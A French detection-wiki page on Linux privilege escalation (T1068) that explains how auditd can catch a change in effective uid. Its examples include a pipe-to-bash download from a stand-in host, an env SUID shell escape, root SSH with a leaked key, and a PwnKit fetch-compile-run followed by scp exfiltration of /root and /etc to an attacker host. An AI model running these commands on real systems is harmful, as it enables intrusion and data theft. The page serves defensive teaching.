---
title: "Élévation de privilèges sous Linux"
description: "Entré avec un compte de service limité, l'attaquant devient root par un exploit, une mauvaise configuration SUID ou une clé oubliée."
tags: [linux, root, suid, pwnkit, auditd]
updated: 2026-11-19
draft: false
type: technique
attack_id: T1068
tactic: privilege-escalation
severity: high
platforms: [Linux]
data_sources: [auditd]
related:
  - 03-menaces-detection/execution/reverse-shell
  - 03-menaces-detection/discovery/decouverte-du-systeme
---

## Description

Un accès initial par une faille web ou un exploit donne souvent un compte de service limité (`www-data`, `serviceuser`) : parfois enfermé dans un dossier comme `/var/www/html`, parfois sans droit de télécharger ou de lancer un malware. Pour aller plus loin, l'attaquant cherche à devenir root. La découverte lui dit comment :

| Si la découverte montre… | …l'attaquant tente |
| --- | --- |
| `uname -a` : un Ubuntu 16.04 ancien, non mis à jour | Un exploit comme PwnKit : `wget http://bad.thm/pwnkit.sh \| bash` |
| `find /bin -perm 4000` : le binaire `env` avec le bit SUID | La faille SUID : `/bin/env /bin/bash -p` |
| `ls /etc/ssh` : un fichier `ssh-backup-key` non protégé | La clé pour se connecter en root : `ssh root@127.0.0.1 -i ssh-backup-key` |

## Ce qu'on observe

Les techniques sont trop nombreuses (des centaines de mauvaises configurations SUID, des milliers de failles logicielles) pour toutes les détecter une à une. Plus universel : détecter **ce qui les entoure**. Exemple en trois temps :

```bash title="découverte, élévation par PwnKit, puis exfiltration en root"
# 1. Rafale de découverte
whoami                                                # répond "www-data"
id; pwd; ls -la; crontab -l
ps aux | egrep "edr|splunk|elastic"                   # outils de sécurité présents ?
uname -r                                              # vieux noyau 4.4

# 2. Téléchargement dans un dossier temporaire
wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c
gcc /tmp/pwnkit.c -o /tmp/pwnkit
chmod +x /tmp/pwnkit
/tmp/pwnkit

# 3. Exfiltration en root
whoami                                                # répond maintenant "root"
tar czf dump.tar.gz /root /etc/
scp dump.tar.gz attacker@c2-server.thm:~
```

Pour confirmer que l'élévation a réussi : comparer l'**utilisateur effectif** (`uid`) avant et après l'exploit. S'il change, l'attaquant a gagné des privilèges.

```text title="pwnkit lancé par serviceuser, qui ouvre un shell root"
root@thm-vm:~$ ausearch -i -x pwnkit
type=PROCTITLE msg=audit(09/19/25 17:56:12.154:416) : proctitle=/tmp/pwnkit
type=SYSCALL msg=audit(09/19/25 17:56:12.154:416) : ppid=24302 pid=24304 auid=unset uid=serviceuser key=exec

root@thm-vm:~$ ausearch -i --ppid 24304
type=PROCTITLE msg=audit(09/19/25 17:56:12.807:418) : proctitle=bash
type=SYSCALL msg=audit(09/19/25 17:56:12.807:418) : ppid=24304 pid=24310 auid=unset uid=root key=exec

root@thm-vm:~$ ausearch -i --ppid 24310
type=PROCTITLE msg=audit(09/19/25 17:56:15.225:424) : proctitle=whoami
type=SYSCALL msg=audit(09/19/25 17:56:15.225:424) : ppid=24310 pid=24312 auid=unset uid=root key=exec
```

## Détection

### auditd

:::etapes
1. **Repérer ce qui entoure**
   Une rafale de [découverte](../discovery/decouverte-du-systeme.md), un [téléchargement](../command-and-control/telechargement-d-outils.md) dans `/tmp`, une exfiltration.
2. **Trouver le binaire suspect**
   `ausearch -i -x <nom>` : noter son `uid`.
3. **Comparer avec ses enfants**
   `ausearch -i --ppid <pid>` : un `uid=root` sous un parent qui ne l'était pas confirme l'élévation.
:::

## Faux positifs

À compléter.

## Réponse

À compléter.
